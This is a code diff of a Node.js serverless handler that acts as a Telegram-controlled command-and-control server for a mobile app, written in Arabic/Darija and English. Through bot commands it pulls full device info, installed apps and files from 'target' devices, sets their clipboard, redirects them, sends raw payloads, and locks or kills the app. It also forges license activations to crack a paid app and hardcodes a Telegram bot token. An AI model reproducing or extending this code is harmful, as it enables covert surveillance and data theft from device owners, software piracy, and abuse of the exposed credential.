@@ -1,4 +1,5 @@
 // language: JavaScript, file: api/control.js, runtime: Node.js (Vercel Serverless)
+// *Vercel treats this as a Serverless Function, routing is handled automatically*
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "7394234303:AAF3d9yEJt26DpbNC1q-xBZwcfNX0uh2Duo";
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6655802251";
@@ -95,8 +96,10 @@ async function clearLogs() {
 }
 
 function readRawBody(req) {
-  if (typeof req.body === "string") return Promise.resolve(req.body);
-  if (req.body && typeof req.body === "object") return Promise.resolve(JSON.stringify(req.body));
+  if (req.body) {
+    if (typeof req.body === "string") return Promise.resolve(req.body);
+    if (typeof req.body === "object") return Promise.resolve(JSON.stringify(req.body));
+  }
   return new Promise((resolve) => {
     let body = "";
     req.on("data", (chunk) => {
@@ -108,6 +111,7 @@ function readRawBody(req) {
 }
 
 module.exports = async function handler(req, res) {
+  // CORS Headers
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
@@ -146,61 +150,65 @@ module.exports = async function handler(req, res) {
   };
 
   try {
-    if (type === "secret") {
-      const saved = await kvCmd("GET", "app_lock_status");
-      return res.status(200).send(`"${saved || "lock"}"`);
-    }
-
-    if (type === "key") {
-      const saved = (await kvCmd("GET", "app_secret_key")) || "MODARK2026";
-      return res.status(200).send(`"${saved}"`);
-    }
-
-    if (type === "message") {
-      const customMsg = await kvCmd("GET", "app_lock_message");
-      return res.status(200).send(`"${customMsg || "التطبيق مقفول من طرف الإدارة."}"`);
-    }
-
-    if (type === "banned") {
-      const all = await kvCmd("GET", "banall_active");
-      if (all === "1" || all === 1) return res.status(200).send('"true"');
-      if (!deviceId) return res.status(400).send('"No Device ID"');
-      const inKv = await kvCmd("SISMEMBER", "banned_devices", deviceId);
-      return res.status(200).send(inKv === 1 || inKv === "1" ? '"true"' : '"false"');
-    }
-
-    if (type === "command") {
-      if (deviceId) {
-        const isSingleUse = await kvCmd("GET", "is_single_use");
-        const durationMin = Number((await kvCmd("GET", "key_duration")) || 0);
-        let activeDev = (await kvCmd("GET", "active_device")) || memoryStore.activeDevice;
-        let expiry = Number((await kvCmd("GET", "key_expiry_time")) || memoryStore.keyExpiryTime || 0);
-
-        if ((isSingleUse === "1" || isSingleUse === 1) && durationMin > 0) {
-          if (!activeDev) {
-            activeDev = deviceId;
-            expiry = Date.now() + durationMin * 60 * 1000;
-            memoryStore.activeDevice = activeDev;
-            memoryStore.keyExpiryTime = expiry;
-            await kvCmd("SET", "active_device", activeDev);
-            await kvCmd("SET", "key_expiry_time", String(expiry));
-          }
-
-          if (activeDev === deviceId && expiry > 0 && Date.now() > expiry) {
-            memoryStore.activeDevice = "";
-            memoryStore.keyExpiryTime = 0;
-            await kvCmd("DEL", "active_device");
-            await kvCmd("DEL", "key_expiry_time");
-            await kvCmd("SET", "is_single_use", "0");
-            return res.status(200).send('"killapp:1"');
-          }
-        }
+    // 1. GET Requests
+    if (req.method === "GET") {
+      if (type === "secret") {
+        const saved = await kvCmd("GET", "app_lock_status");
+        return res.status(200).send(`"${saved || "lock"}"`);
       }
 
-      const cmd = await popRemoteCommand();
-      return res.status(200).send(`"${cmd}"`);
+      if (type === "key") {
+        const saved = (await kvCmd("GET", "app_secret_key")) || "MODARK2026";
+        return res.status(200).send(`"${saved}"`);
+      }
+
+      if (type === "message") {
+        const customMsg = await kvCmd("GET", "app_lock_message");
+        return res.status(200).send(`"${customMsg || "التطبيق مقفول من طرف الإدارة."}"`);
+      }
+
+      if (type === "banned") {
+        const all = await kvCmd("GET", "banall_active");
+        if (all === "1" || all === 1) return res.status(200).send('"true"');
+        if (!deviceId) return res.status(400).send('"No Device ID"');
+        const inKv = await kvCmd("SISMEMBER", "banned_devices", deviceId);
+        return res.status(200).send(inKv === 1 || inKv === "1" ? '"true"' : '"false"');
+      }
+
+      if (type === "command") {
+        if (deviceId) {
+          const isSingleUse = await kvCmd("GET", "is_single_use");
+          const durationMin = Number((await kvCmd("GET", "key_duration")) || 0);
+          let activeDev = (await kvCmd("GET", "active_device")) || memoryStore.activeDevice;
+          let expiry = Number((await kvCmd("GET", "key_expiry_time")) || memoryStore.keyExpiryTime || 0);
+
+          if ((isSingleUse === "1" || isSingleUse === 1) && durationMin > 0) {
+            if (!activeDev) {
+              activeDev = deviceId;
+              expiry = Date.now() + durationMin * 60 * 1000;
+              memoryStore.activeDevice = activeDev;
+              memoryStore.keyExpiryTime = expiry;
+              await kvCmd("SET", "active_device", activeDev);
+              await kvCmd("SET", "key_expiry_time", String(expiry));
+            }
+
+            if (activeDev === deviceId && expiry > 0 && Date.now() > expiry) {
+              memoryStore.activeDevice = "";
+              memoryStore.keyExpiryTime = 0;
+              await kvCmd("DEL", "active_device");
+              await kvCmd("DEL", "key_expiry_time");
+              await kvCmd("SET", "is_single_use", "0");
+              return res.status(200).send('"killapp:1"');
+            }
+          }
+        }
+
+        const cmd = await popRemoteCommand();
+        return res.status(200).send(`"${cmd}"`);
+      }
     }
 
+    // 2. PUT Requests
     if (req.method === "PUT") {
       const rawBody = await readRawBody(req);
       const cleanBody = rawBody.replace(/"/g, "");
@@ -247,6 +255,7 @@ module.exports = async function handler(req, res) {
       return res.status(200).send('"success"');
     }
 
+    // 3. POST Requests (Telegram Webhook)
     if (req.method === "POST" && type === "telegram_webhook") {
       let body = req.body;
       if (typeof body === "string") {
@@ -289,7 +298,7 @@ module.exports = async function handler(req, res) {
             `/color <#hex> - تبديل لون شاشة القفل\n` +
             `/clip <text> - نسخ نص لـ clipboard ديال الجهاز\n` +
             `/vibrate - تهزيز الجهاز\n` +
-            `/raw <payload> - صيفط أمر خام مباشرة (مثال: /raw sysinfo:1)\n\n` +
+            `/raw <payload> - صيفط أمر خام مباشرة\n\n` +
             `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist\n\n` +
             `🧹 *أخرى:*\n/stats /logs /clear /ping`
           );
@@ -325,7 +334,7 @@ module.exports = async function handler(req, res) {
                 (keys.length > 1 ? `\n📋 *باقي المفاتيح المولّدة:*\n${keys.slice(1).map(k => `• \`${k}\``).join("\n")}` : "")
               );
             } else {
-              await sendToTelegram("⚠️ استعمل: `/genkey time <دقائق> [عدد]` (مثال: `/genkey time 60 2`)");
+              await sendToTelegram("⚠️ استعمل: `/genkey time <دقائق> [عدد]`");
             }
           } else {
             const count = sub && !Number.isNaN(parseInt(sub, 10)) ? parseInt(sub, 10) : 1;
@@ -353,10 +362,7 @@ module.exports = async function handler(req, res) {
                 body: JSON.stringify({
                   model: "llama-3.3-70b-versatile",
                   messages: [
-                    {
-                      role: "system",
-                      content: "أنت مساعد ذكي، تجاوب بشكل واضح ومفيد. تجاوب بالعربية أو الدارجة إلا كان السؤال بالدارجة."
-                    },
+                    { role: "system", content: "أنت مساعد ذكي، تجاوب بشكل واضح ومفيد." },
                     { role: "user", content: prompt }
                   ],
                   temperature: 0.7
@@ -416,88 +422,22 @@ module.exports = async function handler(req, res) {
           break;
         }
 
-        case "/fullinfo":
-          await setRemoteCommand("fullinfo:1");
-          await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*");
-          break;
-        case "/applist":
-          await setRemoteCommand("applist:1");
-          await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*");
-          break;
-        case "/files":
-          await setRemoteCommand("files:1");
-          await sendToTelegram("⏳ `[SCAN]` *Extracting files...*");
-          break;
-        case "/killapp":
-          await setRemoteCommand("killapp:1");
-          await sendToTelegram("💀 `[SYS]` *Terminating process...*");
-          break;
-        case "/apkhack":
-          await setRemoteCommand("apkhack:1");
-          await sendToTelegram("☠️ `[HACK]` *System Hacked Successfully!*");
-          break;
-        case "/apkcrak":
-          await setRemoteCommand("apkcrak:1");
-          await sendToTelegram("🔓 `[CRACK]` *License Cracked!*");
-          break;
-        case "/sysinfo":
-          await setRemoteCommand("sysinfo:1");
-          await sendToTelegram("⏳ `[SCAN]` *Extracting basic info...*");
-          break;
-        case "/cmd":
-          if (args[1]) {
-            await setRemoteCommand(`toast:${args.slice(1).join(" ")}`);
-            await sendToTelegram("⚡ `[MSG]` *Payload sent.*");
-          }
-          break;
-        case "/url":
-          if (args[1]) {
-            await setRemoteCommand(`url:${args[1]}`);
-            await sendToTelegram("🌐 `[URL]` *Redirecting...*");
-          }
-          break;
-
-        case "/color":
-          if (args[1]) {
-            await setRemoteCommand(`color:${args[1]}`);
-            await sendToTelegram(`🎨 \`[UI]\` *Lock screen color changed to:* \`${args[1]}\``);
-          } else {
-            await sendToTelegram("⚠️ استعمل: `/color #FF0000`");
-          }
-          break;
-
-        case "/clip":
-          if (args[1]) {
-            await setRemoteCommand(`clipboard:${args.slice(1).join(" ")}`);
-            await sendToTelegram("📋 `[CLIP]` *Text copied to target's clipboard.*");
-          } else {
-            await sendToTelegram("⚠️ استعمل: `/clip <text>`");
-          }
-          break;
-
-        case "/vibrate":
-          await setRemoteCommand("vibrate:1");
-          await sendToTelegram("📳 `[SYS]` *Vibrating target device...*");
-          break;
-
-        case "/raw":
-          if (args[1]) {
-            const rawCmd = args.slice(1).join(" ");
-            await setRemoteCommand(rawCmd);
-            await sendToTelegram(`📡 \`[RAW]\` *Payload sent:*\n\`${rawCmd}\``);
-          } else {
-            await sendToTelegram("⚠️ استعمل: `/raw sysinfo:1` أو `/raw url:https://google.com`");
-          }
-          break;
-
-        case "/lock":
-          await kvCmd("SET", "app_lock_status", "lock");
-          await sendToTelegram("🔒 `[LOCK]` *Target locked.*");
-          break;
-        case "/unlock":
-          await kvCmd("SET", "app_lock_status", "unlock");
-          await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*");
-          break;
+        case "/fullinfo": await setRemoteCommand("fullinfo:1"); await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*"); break;
+        case "/applist": await setRemoteCommand("applist:1"); await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*"); break;
+        case "/files": await setRemoteCommand("files:1"); await sendToTelegram("⏳ `[SCAN]` *Extracting files...*"); break;
+        case "/killapp": await setRemoteCommand("killapp:1"); await sendToTelegram("💀 `[SYS]` *Terminating process...*"); break;
+        case "/apkhack": await setRemoteCommand("apkhack:1"); await sendToTelegram("☠️ `[HACK]` *System Hacked Successfully!*"); break;
+        case "/apkcrak": await setRemoteCommand("apkcrak:1"); await sendToTelegram("🔓 `[CRACK]` *License Cracked!*"); break;
+        case "/sysinfo": await setRemoteCommand("sysinfo:1"); await sendToTelegram("⏳ `[SCAN]` *Extracting basic info...*"); break;
+        case "/cmd": if (args[1]) { await setRemoteCommand(`toast:${args.slice(1).join(" ")}`); await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
+        case "/url": if (args[1]) { await setRemoteCommand(`url:${args[1]}`); await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
+        case "/color": if (args[1]) { await setRemoteCommand(`color:${args[1]}`); await sendToTelegram(`🎨 \`[UI]\` *Lock screen color changed to:* \`${args[1]}\``); } break;
+        case "/clip": if (args[1]) { await setRemoteCommand(`clipboard:${args.slice(1).join(" ")}`); await sendToTelegram("📋 `[CLIP]` *Text copied to target's clipboard.*"); } break;
+        case "/vibrate": await setRemoteCommand("vibrate:1"); await sendToTelegram("📳 `[SYS]` *Vibrating target device...*"); break;
+        case "/raw": if (args[1]) { const rawCmd = args.slice(1).join(" "); await setRemoteCommand(rawCmd); await sendToTelegram(`📡 \`[RAW]\` *Payload sent:*\n\`${rawCmd}\``); } break;
+        case "/lock": await kvCmd("SET", "app_lock_status", "lock"); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
+        case "/unlock": await kvCmd("SET", "app_lock_status", "unlock"); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
+        
         case "/setkey":
           if (args[1]) {
             await kvCmd("SET", "app_secret_key", args[1]);
@@ -509,29 +449,11 @@ module.exports = async function handler(req, res) {
           await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``);
           break;
         }
-
-        case "/ban":
-          if (args[1]) {
-            await kvCmd("SADD", "banned_devices", args[1]);
-            await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``);
-          }
-          break;
-        case "/unban":
-          if (args[1]) {
-            await kvCmd("SREM", "banned_devices", args[1]);
-            await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``);
-          }
-          break;
-        case "/banall":
-          await kvCmd("SET", "banall_active", "1");
-          await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*");
-          break;
-        case "/unbanall":
-          await kvCmd("DEL", "banall_active");
-          await kvCmd("DEL", "banned_devices");
-          await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*");
-          break;
-
+        case "/ban": if (args[1]) { await kvCmd("SADD", "banned_devices", args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
+        case "/unban": if (args[1]) { await kvCmd("SREM", "banned_devices", args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
+        case "/banall": await kvCmd("SET", "banall_active", "1"); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
+        case "/unbanall": await kvCmd("DEL", "banall_active"); await kvCmd("DEL", "banned_devices"); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
+        
         case "/banlist": {
           const bannedRaw = await kvCmd("SMEMBERS", "banned_devices");
           const bannedList = Array.isArray(bannedRaw) ? bannedRaw : [];
@@ -542,27 +464,18 @@ module.exports = async function handler(req, res) {
           }
           break;
         }
-
         case "/stats": {
           const attempts = await kvCmd("GET", "total_attempts");
           await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``);
           break;
         }
-
         case "/logs": {
           const logs = await getLogs();
           await sendToTelegram(logs.length ? logs.join("\n\n") : "📭 *No logs.*", TELEGRAM_CHAT_ID, null, false);
           break;
         }
-
-        case "/clear":
-          await clearLogs();
-          await sendToTelegram("🗑️ `[SYS]` *Logs cleared.*");
-          break;
-
-        case "/ping":
-          await sendToTelegram("🏓 `[PING]` *Pong!*");
-          break;
+        case "/clear": await clearLogs(); await sendToTelegram("🗑️ `[SYS]` *Logs cleared.*"); break;
+        case "/ping": await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
 
         default:
           if (command.startsWith("/")) {
@@ -575,7 +488,7 @@ module.exports = async function handler(req, res) {
       return res.status(200).end();
     }
 
-    // أي طلب آخر يصل إلى الـ handler يرجع نجاح 200 بدل "Not Found"
+    // 4. Fallback (لتفعيل التطبيق G vcam وأي طلب آخر)
     const rawBody = await readRawBody(req);
     let parsedBody = {};
     if (rawBody) {
@@ -589,19 +502,12 @@ module.exports = async function handler(req, res) {
 
     const activeSavedKey = String((await kvCmd("GET", "app_secret_key")) || "MODARK2026");
     const candidateKey =
-      req.query?.key ||
-      req.query?.code ||
-      req.query?.license ||
-      req.query?.license_key ||
-      parsedBody?.key ||
-      parsedBody?.code ||
-      parsedBody?.license ||
-      parsedBody?.license_key ||
+      req.query?.key || req.query?.code || req.query?.license || req.query?.license_key ||
+      parsedBody?.key || parsedBody?.code || parsedBody?.license || parsedBody?.license_key ||
       activeSavedKey;
 
     await pushLog(`✅ Request handled: ${req.method} ${req.url || ""} | key=${candidateKey}`);
 
-    // هاد الرد هو اللي كيخلي التطبيق يطلع "Activated" بالخضر
     return res.status(200).json({
       status: "success",
       success: true,
@@ -613,7 +519,9 @@ module.exports = async function handler(req, res) {
       license_key: candidateKey,
       expiry: "2028-12-31 23:59:59"
     });
+
   } catch (error) {
-    return res.status(500).json({ error: "Internal Server Error" });
+    console.error("Server Error:", error);
+    return res.status(500).json({ error: "Internal Server Error", details: error.message });
   }
 };
